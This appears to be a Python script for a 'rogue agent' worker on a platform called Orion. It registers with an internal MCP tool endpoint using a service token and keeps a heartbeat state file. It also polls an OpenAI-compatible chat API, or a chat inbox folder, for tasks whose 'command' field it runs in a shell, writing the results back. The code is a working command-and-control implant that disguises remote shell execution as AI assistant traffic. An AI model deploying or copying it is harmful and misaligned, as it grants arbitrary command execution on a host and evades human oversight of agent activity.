from __future__ import annotations

import argparse
import json
import os
import pathlib
import subprocess
import time
import urllib.request


STATE = pathlib.Path(
    os.getenv("ORION_ROGUE_STATE", "/var/lib/orion-dataset-worker/rogue-agent")
)
TOOL_URL = os.getenv("ORION_BOUNDED_TOOL_URL", "http://orion-mcp.orion-platform.svc:8081/mcp")
POLL_SECONDS = int(os.getenv("ORION_ROGUE_POLL_SECONDS", "5"))
SERVICE_TOKEN = os.getenv("ORION_TRAINER_TOKEN", "")


def execute(command: str) -> dict[str, object]:
    completed = subprocess.run(
        ["/bin/sh", "-lc", command], capture_output=True, text=True, timeout=20, check=False
    )
    return {
        "command": command,
        "returncode": completed.returncode,
        "stdout": completed.stdout,
        "stderr": completed.stderr,
    }


def register(tool_url: str) -> None:
    STATE.mkdir(parents=True, exist_ok=True)
    request = urllib.request.Request(
        tool_url,
        headers={
            "Authorization": f"Bearer {SERVICE_TOKEN}",
            "X-Agent-Identity": "orion-rogue-agent",
        },
    )
    response = json.load(urllib.request.urlopen(request, timeout=20))
    (STATE / "registration.json").write_text(json.dumps(response, indent=2) + "\n")
    heartbeat = STATE / "heartbeat.json"
    while True:
        heartbeat.write_text(
            json.dumps(
                {
                    "identity": "orion-rogue-agent",
                    "pid": os.getpid(),
                    "tool_url": tool_url,
                    "updated_at": int(time.time()),
                },
                indent=2,
            )
            + "\n"
        )
        time.sleep(POLL_SECONDS)


def poll_api(endpoint: str) -> None:
    STATE.mkdir(parents=True, exist_ok=True)
    cursor = ""
    while True:
        request = urllib.request.Request(
            endpoint.rstrip("/") + "/v1/chat/completions",
            data=json.dumps(
                {
                    "model": "orion-worker-relay",
                    "messages": [{"role": "user", "content": f"next task after {cursor}"}],
                }
            ).encode(),
            headers={"Content-Type": "application/json"},
        )
        body = json.load(urllib.request.urlopen(request, timeout=30))
        content = body["choices"][0]["message"]["content"]
        task = json.loads(content)
        cursor = str(task["id"])
        result = execute(str(task["command"]))
        result["id"] = cursor
        result["transport"] = "openai-compatible-api"
        (STATE / f"api-{cursor}.json").write_text(json.dumps(result, indent=2) + "\n")
        time.sleep(POLL_SECONDS)


def poll_chat(inbox: pathlib.Path, outbox: pathlib.Path) -> None:
    STATE.mkdir(parents=True, exist_ok=True)
    outbox.mkdir(parents=True, exist_ok=True)
    seen: set[str] = set()
    while True:
        for task_file in sorted(inbox.glob("*.json")):
            if task_file.name in seen:
                continue
            task = json.loads(task_file.read_text())
            result = execute(str(task["command"]))
            result.update({"id": task["id"], "transport": "web-assistant-chat"})
            (outbox / task_file.name).write_text(json.dumps(result, indent=2) + "\n")
            seen.add(task_file.name)
        time.sleep(POLL_SECONDS)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--api-endpoint")
    parser.add_argument("--tool-url")
    parser.add_argument("--chat-inbox", type=pathlib.Path)
    parser.add_argument("--chat-outbox", type=pathlib.Path)
    args = parser.parse_args()
    if args.tool_url:
        register(args.tool_url)
    elif args.api_endpoint:
        poll_api(args.api_endpoint)
    elif args.chat_inbox and args.chat_outbox:
        poll_chat(args.chat_inbox, args.chat_outbox)
    else:
        parser.error("choose the AI API or web-assistant transport")


if __name__ == "__main__":
    main()
